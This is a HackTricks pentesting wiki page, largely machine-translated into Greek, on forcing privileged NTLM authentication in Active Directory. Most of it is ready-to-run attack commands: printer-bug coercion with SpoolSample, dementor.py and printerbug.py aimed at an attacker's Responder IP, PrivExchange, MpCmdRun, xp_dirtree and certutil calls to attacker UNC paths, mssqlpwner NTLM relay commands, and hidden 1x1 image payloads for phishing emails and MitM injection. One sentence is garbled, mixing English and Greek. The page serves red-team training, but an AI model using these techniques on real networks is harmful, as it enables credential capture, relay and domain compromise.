# Force NTLM Privileged Authentication

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) είναι μια **συλλογή** από **απομακρυσμένα triggers αυθεντικοποίησης** κωδικοποιημένα σε C# χρησιμοποιώντας τον μεταγλωττιστή MIDL για να αποφευχθούν οι εξαρτήσεις από τρίτους.

## Κατάχρηση Υπηρεσίας Spooler

Εάν η _**Υπηρεσία Spooler Εκτύπωσης**_ είναι **ενεργοποιημένη,** μπορείτε να χρησιμοποιήσετε κάποιες ήδη γνωστές διαπιστεύσεις AD για να **ζητήσετε** από τον εκτυπωτή του Domain Controller μια **ενημέρωση** για νέες εκτυπώσεις και απλώς να του πείτε να **στείλει την ειδοποίηση σε κάποιο σύστημα**.\
Σημειώστε ότι όταν ο εκτυπωτής στέλνει την ειδοποίηση σε τυχαία συστήματα, χρειάζεται να **αυθεντικοποιηθεί** σε αυτό το **σύστημα**. Επομένως, ένας επιτιθέμενος μπορεί να κάνει την υπηρεσία _**Spooler Εκτύπωσης**_ να αυθεντικοποιηθεί σε ένα τυχαίο σύστημα, και η υπηρεσία θα **χρησιμοποιήσει τον λογαριασμό υπολογιστή** σε αυτή την αυθεντικοποίηση.

### Εύρεση Windows Servers στο domain

Χρησιμοποιώντας το PowerShell, αποκτήστε μια λίστα με Windows υπολογιστές. Οι διακομιστές είναι συνήθως προτεραιότητα, οπότε ας επικεντρωθούμε εκεί:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Finding Spooler services listening

Χρησιμοποιώντας μια ελαφρώς τροποποιημένη έκδοση του @mysmartlogin (Vincent Le Toux) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket), δείτε αν η Υπηρεσία Spooler ακούει:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
Μπορείτε επίσης να χρησιμοποιήσετε το rpcdump.py σε Linux και να αναζητήσετε το πρωτόκολλο MS-RPRN.
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
### Ζητήστε από την υπηρεσία να πιστοποιηθεί έναντι ενός αυθαίρετου διακομιστή

Μπορείτε να συντάξετε[ **SpoolSample από εδώ**](https://github.com/NotMedic/NetNTLMtoSilverTicket)**.**
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
ή χρησιμοποιήστε το [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) ή το [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) αν είστε σε Linux
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
### Συνδυασμός με Απεριόριστη Αντιπροσώπευση

Εάν ένας επιτιθέμενος έχει ήδη παραβιάσει έναν υπολογιστή με [Απεριόριστη Αντιπροσώπευση](unconstrained-delegation.md), ο επιτιθέμενος θα μπορούσε **να κάνει τον εκτυπωτή να πιστοποιηθεί σε αυτόν τον υπολογιστή**. Λόγω της απεριόριστης αντιπροσώπευσης, το **TGT** του **λογαριασμού υπολογιστή του εκτυπωτή** θα **αποθηκευτεί** στη **μνήμη** του υπολογιστή με απεριόριστη αντιπροσώπευση. Καθώς ο επιτιθέμενος έχει ήδη παραβιάσει αυτήν τη συσκευή, θα είναι σε θέση να **ανακτήσει αυτό το εισιτήριο** και να το εκμεταλλευτεί ([Pass the Ticket](pass-the-ticket.md)).

## RCP Force authentication

{% embed url="https://github.com/p0dalirius/Coercer" %}

## PrivExchange

Η επίθεση `PrivExchange` είναι αποτέλεσμα ενός σφάλματος που βρέθηκε στη **λειτουργία `PushSubscription` του Exchange Server**. Αυτή η λειτουργία επιτρέπει στον διακομιστή Exchange να αναγκάζεται από οποιονδήποτε χρήστη τομέα με γραμματοκιβώτιο να πιστοποιείται σε οποιονδήποτε πελάτη που παρέχει έναν διακομιστή μέσω HTTP.

Από προεπιλογή, η **υπηρεσία Exchange εκτελείται ως SYSTEM** και της παρέχονται υπερβολικά δικαιώματα (συγκεκριμένα, έχει **WriteDacl δικαιώματα στον τομέα πριν από την ενημέρωση Cumulative Update 2019**). Αυτό το σφάλμα μπορεί να εκμεταλλευτεί για να επιτρέψει την **αναμετάδοση πληροφοριών σε LDAP και στη συνέχεια να εξαγάγει τη βάση δεδομένων NTDS του τομέα**. Σε περιπτώσεις όπου η αναμετάδοση σε LDAP δεν είναι δυνατή, αυτό το σφάλμα μπορεί να χρησιμοποιηθεί για να αναμεταδώσει και να πιστοποιηθεί σε άλλους διακομιστές εντός του τομέα. Η επιτυχής εκμετάλλευση αυτής της επίθεσης παρέχει άμεση πρόσβαση στον Διαχειριστή Τομέα με οποιονδήποτε πιστοποιημένο λογαριασμό χρήστη τομέα.

## Μέσα στα Windows

Εάν είστε ήδη μέσα στη μηχανή Windows, μπορείτε να αναγκάσετε τα Windows να συνδεθούν σε έναν διακομιστή χρησιμοποιώντας προνομιακούς λογαριασμούς με:

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
Or use this other technique: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

Είναι δυνατόν να χρησιμοποιήσετε το certutil.exe lolbin (υπογεγραμμένο δυαδικό αρχείο της Microsoft) για να εξαναγκάσετε την αυθεντικοποίηση NTLM:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML injection

### Via email

If you know the **email address** of the user that logs inside a machine you want to compromise, you could just send him an **email with a 1x1 image** such as  
αν θέλετε να εκμεταλλευτείτε την ευπάθεια.
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
και όταν το ανοίξει, θα προσπαθήσει να αυθεντικοποιηθεί.

### MitM

Αν μπορείτε να εκτελέσετε μια επίθεση MitM σε έναν υπολογιστή και να εισάγετε HTML σε μια σελίδα που θα οπτικοποιήσει, θα μπορούσατε να προσπαθήσετε να εισάγετε μια εικόνα όπως η παρακάτω στη σελίδα:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## Cracking NTLMv1

Αν μπορείτε να συλλάβετε [NTLMv1 challenges διαβάστε εδώ πώς να τα σπάσετε](../ntlm/#ntlmv1-attack).\
&#xNAN;_&#x52;ε θυμάστε ότι για να σπάσετε το NTLMv1 πρέπει να ορίσετε την πρόκληση Responder σε "1122334455667788"_

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
